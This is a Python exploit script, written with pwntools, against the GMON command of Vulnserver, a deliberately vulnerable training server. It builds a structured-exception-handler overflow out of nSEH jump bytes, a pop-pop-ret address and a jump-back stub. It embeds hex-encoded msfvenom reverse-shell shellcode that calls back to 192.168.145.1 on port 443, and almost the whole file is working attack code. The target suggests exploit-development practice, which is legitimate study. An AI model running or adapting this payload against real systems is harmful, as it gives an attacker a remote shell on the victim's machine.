#!/usr/bin/python3

# ============================================
# Vulnserver GMON exploit via SEH handler
# ============================================

from pwn import *

# target info
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# phase 1: test offset
vulncmd = b"GMON /.:/"
crash = 4000

# msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=192.168.145.1 LPORT=443  -f hex EXINTFUNC=thread 
# this way produces a neater script
shellcode = binascii.unhexlify("be3c463867dacdd97424f45d29c9b15283c50431750e034948da924dbc985dad3dfdd4480c3d82193f8dc04fcc66847b470a018ce0a177a3f19a44a271e198044b2aed458c571c174513b387e269082cb87c08d1097e394401d99967c651907f0b5f6af4ff2b6ddc31d3c221fe261a6639d9699e39646a6543b2ff7de331a75915953e2a195234743e65990f3aee1cdfcab43afb976f225a72c15bbcddbef9b7f0ab739a9c18be245d37c9576f9861ffc351acf824480896da7369bf182739d78948d227359d7577994e3627593fde2d5660fe4ebc0995b557f6c224a69e1046a8e59ca0c009c97b7db350f71c3c4f721eb67c83d13f089786cf47c501cf7d61cd421a71987eb526cdb1cca2e3e866d0f96d4050264e4f59abea6b4975f2373d29a5e1eb8f1f404546f30a011f3f8d57206a7bb791c33ac81e84cab142343468c7447f306ecd26a13290d81c70ad5a94094a42dd0c16c40e7d07a130d228e0")

junk = b"A" * (3515 - len(shellcode))
jumpback = asm("push esp; pop eax; add ax, 0x565; jmp eax;") # b'TXf\x05e\x05\xff\xe0'
#jumpback = b"\x54\x58\x66\x05\x65\x05\xff\xe0" # manual hand encoding from nasmshell - also working


nseh = p32(0x09eb9090)  # 2x noops, then jump 9 bytes to the next A (eb means JMP SHORT)
seh = p32(0x625010b4)  # pop pop ret


#cyclic_pattern = cyclic_metasploit(6000)

payload = b"".join([
    vulncmd,
    shellcode,
    junk,
    nseh,
    seh,
    b"\x90"*5,
    jumpback
])

payload += b"X" * (crash - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[*] Payload sent!")
s.close()